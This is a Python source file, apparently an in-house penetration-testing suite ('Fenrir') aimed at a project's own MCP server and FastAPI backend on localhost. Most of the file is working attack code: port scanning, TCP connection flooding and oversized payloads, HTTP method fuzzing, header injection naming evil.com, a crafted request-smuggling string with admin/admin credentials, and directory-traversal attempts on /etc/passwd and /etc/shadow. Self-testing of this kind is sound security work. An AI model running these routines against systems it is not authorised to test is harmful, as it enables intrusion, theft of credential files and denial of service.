#!/usr/bin/env python3
"""ü¶ä Fenrir Network Attack Suite
=============================

Network-level attacks for the Reynard MCP server and FastAPI backend.
This module exploits network protocols, socket communication, and service discovery.

Attack Vectors:
1. Port Scanning and Service Discovery
2. TCP Socket Exploitation
3. HTTP/HTTPS Protocol Attacks
4. WebSocket Communication Exploitation
5. Unix Socket Communication (if available)
6. Network Traffic Interception
7. Service Enumeration
8. Protocol Fuzzing

Author: Odonata-Oracle-6 (Dragonfly Specialist)
Version: 1.0.0
"""

import asyncio
import json
import logging
import socket
import time
from concurrent.futures import ThreadPoolExecutor
from typing import Any, Dict, List, Optional, Tuple

import aiohttp
import requests

logger = logging.getLogger(__name__)


class NetworkAttacker:
    """Network-level attack suite for MCP server and backend."""

    def __init__(self):
        """Initialize the network attacker."""
        self.target_host = "localhost"
        self.mcp_port = 8001
        self.backend_port = 8000
        self.attack_results = []

    async def scan_ports_and_services(self) -> List[Dict[str, Any]]:
        """Scan for open ports and running services."""
        logger.info("üîç Scanning ports and services...")
        results = []

        # Common ports to scan
        ports_to_scan = [
            8000,  # FastAPI backend
            8001,  # MCP server
            5432,  # PostgreSQL
            6379,  # Redis
            3000,  # Development server
            8080,  # Alternative HTTP
            8443,  # HTTPS
            9000,  # Alternative port
        ]

        for port in ports_to_scan:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.target_host, port))
                sock.close()

                if result == 0:
                    # Port is open, try to identify service
                    service_info = await self._identify_service(port)
                    results.append(
                        {
                            "attack": f"port_scan_{port}",
                            "success": True,
                            "details": f"Port {port} is open",
                            "service": service_info,
                        }
                    )
                else:
                    results.append(
                        {
                            "attack": f"port_scan_{port}",
                            "success": False,
                            "details": f"Port {port} is closed",
                        }
                    )

            except Exception as e:
                results.append(
                    {
                        "attack": f"port_scan_{port}",
                        "success": False,
                        "details": f"Failed to scan port {port}: {e}",
                        "error": str(e),
                    }
                )

        return results

    async def _identify_service(self, port: int) -> Dict[str, Any]:
        """Identify the service running on a port."""
        service_info = {"port": port, "type": "unknown"}

        try:
            if port == 8000:
                # FastAPI backend
                response = requests.get(f"http://{self.target_host}:{port}/", timeout=2)
                service_info.update(
                    {
                        "type": "http",
                        "service": "FastAPI Backend",
                        "status_code": response.status_code,
                        "headers": dict(response.headers),
                    }
                )
            elif port == 8001:
                # MCP server
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(self.target_host, port), timeout=2
                    )
                    writer.close()
                    await writer.wait_closed()
                    service_info.update(
                        {"type": "tcp", "service": "MCP Server", "status": "responsive"}
                    )
                except:
                    service_info.update(
                        {
                            "type": "tcp",
                            "service": "MCP Server",
                            "status": "unresponsive",
                        }
                    )
            elif port == 5432:
                # PostgreSQL
                service_info.update({"type": "database", "service": "PostgreSQL"})
            elif port == 6379:
                # Redis
                service_info.update({"type": "cache", "service": "Redis"})

        except Exception as e:
            service_info["error"] = str(e)

        return service_info

    async def attack_tcp_socket_communication(self) -> List[Dict[str, Any]]:
        """Attack TCP socket communication."""
        logger.info("üîç Attacking TCP socket communication...")
        results = []

        # Attack 1: Connection flooding
        try:
            connections = []
            for i in range(10):
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(self.target_host, self.mcp_port),
                        timeout=1,
                    )
                    connections.append((reader, writer))
                except:
                    break

            results.append(
                {
                    "attack": "tcp_connection_flooding",
                    "success": len(connections) > 5,
                    "details": f"Successfully opened {len(connections)} concurrent connections",
                    "connection_count": len(connections),
                }
            )

            # Close connections
            for reader, writer in connections:
                writer.close()
                await writer.wait_closed()

        except Exception as e:
            results.append(
                {
                    "attack": "tcp_connection_flooding",
                    "success": False,
                    "details": f"Failed to flood TCP connections: {e}",
                    "error": str(e),
                }
            )

        # Attack 2: Large payload injection
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.target_host, self.mcp_port), timeout=5
            )

            # Send very large payload
            large_payload = "A" * 10000 + "\n"
            writer.write(large_payload.encode())
            await writer.drain()

            # Try to read response
            try:
                response_data = await asyncio.wait_for(reader.readline(), timeout=2)
                response = response_data.decode().strip()
                results.append(
                    {
                        "attack": "tcp_large_payload",
                        "success": True,
                        "details": f"Large payload accepted, response: {response[:100]}...",
                        "response_length": len(response),
                    }
                )
            except asyncio.TimeoutError:
                results.append(
                    {
                        "attack": "tcp_large_payload",
                        "success": True,
                        "details": "Large payload caused timeout (potential DoS)",
                    }
                )

            writer.close()
            await writer.wait_closed()

        except Exception as e:
            results.append(
                {
                    "attack": "tcp_large_payload",
                    "success": False,
                    "details": f"Failed to send large payload: {e}",
                    "error": str(e),
                }
            )

        return results

    async def attack_http_protocol(self) -> List[Dict[str, Any]]:
        """Attack HTTP protocol endpoints."""
        logger.info("üîç Attacking HTTP protocol...")
        results = []

        # Attack 1: HTTP method fuzzing
        http_methods = [
            "GET",
            "POST",
            "PUT",
            "DELETE",
            "PATCH",
            "HEAD",
            "OPTIONS",
            "TRACE",
        ]
        endpoints = [
            "/",
            "/api/mcp/bootstrap/health",
            "/api/mcp/tools/health",
            "/api/docs",
        ]

        for endpoint in endpoints:
            for method in http_methods:
                try:
                    response = requests.request(
                        method,
                        f"http://{self.target_host}:{self.backend_port}{endpoint}",
                        timeout=2,
                    )

                    results.append(
                        {
                            "attack": f"http_method_fuzzing_{method}_{endpoint.replace('/', '_')}",
                            "success": response.status_code not in [405, 404],
                            "details": f"{method} {endpoint} returned {response.status_code}",
                            "status_code": response.status_code,
                            "response_length": len(response.text),
                        }
                    )

                except Exception as e:
                    results.append(
                        {
                            "attack": f"http_method_fuzzing_{method}_{endpoint.replace('/', '_')}",
                            "success": False,
                            "details": f"Failed to send {method} request: {e}",
                            "error": str(e),
                        }
                    )

        # Attack 2: HTTP header injection
        try:
            malicious_headers = {
                "X-Forwarded-For": "127.0.0.1",
                "X-Real-IP": "127.0.0.1",
                "X-Forwarded-Host": "evil.com",
                "X-Forwarded-Proto": "https",
                "User-Agent": "Mozilla/5.0 (compatible; EvilBot/1.0)",
                "Authorization": "Bearer fake-token",
                "X-Custom-Header": "../../../etc/passwd",
            }

            response = requests.get(
                f"http://{self.target_host}:{self.backend_port}/api/mcp/bootstrap/health",
                headers=malicious_headers,
                timeout=5,
            )

            results.append(
                {
                    "attack": "http_header_injection",
                    "success": response.status_code == 200,
                    "details": f"Header injection returned {response.status_code}",
                    "status_code": response.status_code,
                    "response": response.text[:200] if response.text else "No response",
                }
            )

        except Exception as e:
            results.append(
                {
                    "attack": "http_header_injection",
                    "success": False,
                    "details": f"Failed to inject headers: {e}",
                    "error": str(e),
                }
            )

        # Attack 3: HTTP request smuggling
        try:
            # Try to smuggle requests
            smuggled_request = (
                "POST /api/mcp/bootstrap/authenticate HTTP/1.1\r\n"
                "Host: localhost:8000\r\n"
                "Content-Length: 100\r\n"
                "Content-Type: application/json\r\n"
                "\r\n"
                '{"client_id": "admin", "client_secret": "admin"}'
                "GET /api/mcp/tools/health HTTP/1.1\r\n"
                "Host: localhost:8000\r\n"
                "\r\n"
            )

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target_host, self.backend_port))
            sock.send(smuggled_request.encode())

            response = sock.recv(4096).decode()
            sock.close()

            results.append(
                {
                    "attack": "http_request_smuggling",
                    "success": "200" in response,
                    "details": f"Request smuggling attempt, response: {response[:200]}...",
                    "response": response[:500],
                }
            )

        except Exception as e:
            results.append(
                {
                    "attack": "http_request_smuggling",
                    "success": False,
                    "details": f"Failed to attempt request smuggling: {e}",
                    "error": str(e),
                }
            )

        return results

    async def attack_websocket_communication(self) -> List[Dict[str, Any]]:
        """Attack WebSocket communication (if available)."""
        logger.info("üîç Attacking WebSocket communication...")
        results = []

        # Check for WebSocket endpoints
        websocket_endpoints = [
            "/ws",
            "/websocket",
            "/api/ws",
            "/api/websocket",
            "/api/mcp/ws",
            "/api/mcp/websocket",
        ]

        for endpoint in websocket_endpoints:
            try:
                # Try to upgrade to WebSocket
                headers = {
                    "Upgrade": "websocket",
                    "Connection": "Upgrade",
                    "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                    "Sec-WebSocket-Version": "13",
                }

                response = requests.get(
                    f"http://{self.target_host}:{self.backend_port}{endpoint}",
                    headers=headers,
                    timeout=2,
                )

                results.append(
                    {
                        "attack": f"websocket_upgrade_{endpoint.replace('/', '_')}",
                        "success": response.status_code == 101,
                        "details": f"WebSocket upgrade attempt returned {response.status_code}",
                        "status_code": response.status_code,
                        "headers": dict(response.headers),
                    }
                )

            except Exception as e:
                results.append(
                    {
                        "attack": f"websocket_upgrade_{endpoint.replace('/', '_')}",
                        "success": False,
                        "details": f"Failed to attempt WebSocket upgrade: {e}",
                        "error": str(e),
                    }
                )

        return results

    async def attack_unix_socket_communication(self) -> List[Dict[str, Any]]:
        """Attack Unix socket communication (if available)."""
        logger.info("üîç Attacking Unix socket communication...")
        results = []

        # Common Unix socket paths
        unix_socket_paths = [
            "/tmp/mcp.sock",
            "/tmp/reynard.sock",
            "/tmp/backend.sock",
            "/var/run/mcp.sock",
            "/var/run/reynard.sock",
            "/var/run/backend.sock",
            "/tmp/sockets/mcp.sock",
            "/tmp/sockets/reynard.sock",
        ]

        for socket_path in unix_socket_paths:
            try:
                sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect(socket_path)
                sock.close()

                results.append(
                    {
                        "attack": f"unix_socket_access_{socket_path.replace('/', '_')}",
                        "success": True,
                        "details": f"Unix socket accessible: {socket_path}",
                        "socket_path": socket_path,
                    }
                )

            except FileNotFoundError:
                results.append(
                    {
                        "attack": f"unix_socket_access_{socket_path.replace('/', '_')}",
                        "success": False,
                        "details": f"Unix socket not found: {socket_path}",
                    }
                )
            except Exception as e:
                results.append(
                    {
                        "attack": f"unix_socket_access_{socket_path.replace('/', '_')}",
                        "success": False,
                        "details": f"Failed to access Unix socket {socket_path}: {e}",
                        "error": str(e),
                    }
                )

        return results

    async def attack_service_enumeration(self) -> List[Dict[str, Any]]:
        """Attack service enumeration and information disclosure."""
        logger.info("üîç Attacking service enumeration...")
        results = []

        # Attack 1: API endpoint enumeration
        api_endpoints = [
            "/api/docs",
            "/api/openapi.json",
            "/api/redoc",
            "/api/swagger.json",
            "/api/v1/docs",
            "/api/v2/docs",
            "/docs",
            "/swagger",
            "/redoc",
            "/openapi.json",
        ]

        for endpoint in api_endpoints:
            try:
                response = requests.get(
                    f"http://{self.target_host}:{self.backend_port}{endpoint}",
                    timeout=2,
                )

                results.append(
                    {
                        "attack": f"api_endpoint_enumeration_{endpoint.replace('/', '_')}",
                        "success": response.status_code == 200,
                        "details": f"API endpoint accessible: {endpoint}",
                        "status_code": response.status_code,
                        "content_type": response.headers.get("content-type", "unknown"),
                        "response_length": len(response.text),
                    }
                )

            except Exception as e:
                results.append(
                    {
                        "attack": f"api_endpoint_enumeration_{endpoint.replace('/', '_')}",
                        "success": False,
                        "details": f"Failed to access {endpoint}: {e}",
                        "error": str(e),
                    }
                )

        # Attack 2: Directory traversal
        directory_traversal_paths = [
            "../../../etc/passwd",
            "../../../etc/shadow",
            "../../../etc/hosts",
            "../../../var/log/syslog",
            "../../../proc/version",
            "../../../proc/cpuinfo",
            "../../../proc/meminfo",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        ]

        for path in directory_traversal_paths:
            try:
                response = requests.get(
                    f"http://{self.target_host}:{self.backend_port}/api/mcp/bootstrap/health?file={path}",
                    timeout=2,
                )

                # Check if we got system file content
                response_text = response.text.lower()
                system_indicators = [
                    "root:",
                    "localhost",
                    "linux",
                    "windows",
                    "cpu",
                    "memory",
                ]

                found_indicators = [
                    indicator
                    for indicator in system_indicators
                    if indicator in response_text
                ]

                results.append(
                    {
                        "attack": f"directory_traversal_{path.replace('/', '_').replace('\\', '_')}",
                        "success": len(found_indicators) > 0,
                        "details": f"Directory traversal attempt: {path}",
                        "found_indicators": found_indicators,
                        "response_length": len(response.text),
                    }
                )

            except Exception as e:
                results.append(
                    {
                        "attack": f"directory_traversal_{path.replace('/', '_').replace('\\', '_')}",
                        "success": False,
                        "details": f"Failed directory traversal attempt: {e}",
                        "error": str(e),
                    }
                )

        return results

    async def run_all_network_attacks(self) -> Dict[str, Any]:
        """Run all network-level attacks."""
        logger.info("ü¶ä Starting comprehensive network attack suite...")
        logger.info("=" * 60)

        all_results = []

        # Run all attack categories
        attack_categories = [
            ("Port Scanning", self.scan_ports_and_services),
            ("TCP Socket Communication", self.attack_tcp_socket_communication),
            ("HTTP Protocol", self.attack_http_protocol),
            ("WebSocket Communication", self.attack_websocket_communication),
            ("Unix Socket Communication", self.attack_unix_socket_communication),
            ("Service Enumeration", self.attack_service_enumeration),
        ]

        for category_name, attack_func in attack_categories:
            logger.info(f"\nüîç Running {category_name} attacks...")
            try:
                results = await attack_func()
                all_results.extend(results)

                successful_attacks = [r for r in results if r.get("success", False)]
                logger.info(
                    f"‚úÖ {category_name}: {len(successful_attacks)}/{len(results)} attacks successful"
                )

            except Exception as e:
                logger.error(f"‚ùå {category_name} attacks failed: {e}")
                all_results.append(
                    {
                        "attack": f"{category_name}_category_failure",
                        "success": False,
                        "details": f"Attack category failed: {e}",
                        "error": str(e),
                    }
                )

        # Summary
        total_attacks = len(all_results)
        successful_attacks = len([r for r in all_results if r.get("success", False)])

        logger.info("\n" + "=" * 60)
        logger.info("ü¶ä Network Attack Results Summary")
        logger.info("=" * 60)
        logger.info(f"Total Attacks: {total_attacks}")
        logger.info(f"Successful Attacks: {successful_attacks}")
        logger.info(f"Failed Attacks: {total_attacks - successful_attacks}")
        logger.info(f"Success Rate: {(successful_attacks / total_attacks) * 100:.1f}%")

        if successful_attacks > 0:
            logger.warning(
                "‚ö†Ô∏è  Network vulnerabilities found! Review the successful attacks above."
            )
        else:
            logger.info(
                "‚úÖ No network vulnerabilities found in the tested attack vectors."
            )

        return {
            "total_attacks": total_attacks,
            "successful_attacks": successful_attacks,
            "failed_attacks": total_attacks - successful_attacks,
            "success_rate": (successful_attacks / total_attacks) * 100,
            "results": all_results,
        }


async def main():
    """Main entry point for network attacks."""
    attacker = NetworkAttacker()
    results = await attacker.run_all_network_attacks()

    # Save results to file
    with open("/tmp/fenrir_network_attack_results.json", "w") as f:
        json.dump(results, f, indent=2)

    logger.info(
        f"üìä Network attack results saved to /tmp/fenrir_network_attack_results.json"
    )

    return results


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
